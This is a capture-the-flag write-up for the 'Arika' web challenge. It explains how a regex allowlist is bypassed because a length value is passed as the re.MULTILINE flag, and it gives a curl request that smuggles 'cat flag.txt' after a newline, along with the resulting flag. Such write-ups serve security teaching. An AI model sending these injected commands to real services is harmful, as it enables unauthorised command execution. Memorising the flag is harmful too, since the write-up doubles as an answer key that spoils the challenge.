@@ -1,0 +1,53 @@
+Challenge: Arika
+Category: Web
+Author: John Hammond
+
+Description:
+
+The Arika ransomware group likes to look slick and spiffy with their cool green-on-black terminal style website... but it sounds like they are worried about some security concerns of their own!
+
+The password for the ZIP archive below is arika.
+
+Solve:
+
+1. Download the zip file from the challenge website and extract
+
+┌──(ctf㉿kali)-[~/CTF/huntress2025/web/arika]
+└─$ 7z x -parika arika.zip   
+
+7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
+ 64-bit locale=en_US.UTF-8 Threads:16 OPEN_MAX:1024, ASM
+
+Scanning the drive for archives:
+1 file, 6937 bytes (7 KiB)
+
+Extracting archive: arika.zip
+--
+Path = arika.zip
+Type = zip
+Physical Size = 6937
+
+Everything is Ok
+
+Files: 13
+Size:       12357
+Compressed: 6937
+
+2. Review app.py for vulnerabilities
+	2a. re.match(r"^%s$" % allowed, command, len(ALLOWLIST))
+	2b. len(ALLOWLIST) is 8, which Python treats as the regex flag re.MULTILINE.
+	2c. With re.MULTILINE, ^ and $ match line boundaries, not just the start/end of the whole string.
+
+3. Send a forged command to the server after "\n"
+
+┌──(ctf㉿kali)-[~/Downloads]
+└─$ curl -s http://10.1.40.243/ \
+  -H "Content-Type: application/json" \
+  -d '{"command":"whoami\ncat flag.txt"}'
+{"code":0,"ok":true,"stderr":"","stdout":"guest\nflag{eaec346846596f7976da7e1adb1f326d}\n"}
+
+Flag: flag{eaec346846596f7976da7e1adb1f326d}
+
+	3a. Alternatively you could use dev tools, and edit/resend an existing command [dev-tools-solve-1.png]
+	3b. Forge the command [dev-tools-solve-2.png]
+	3c. Review the response [dev-tools-solve3.png]
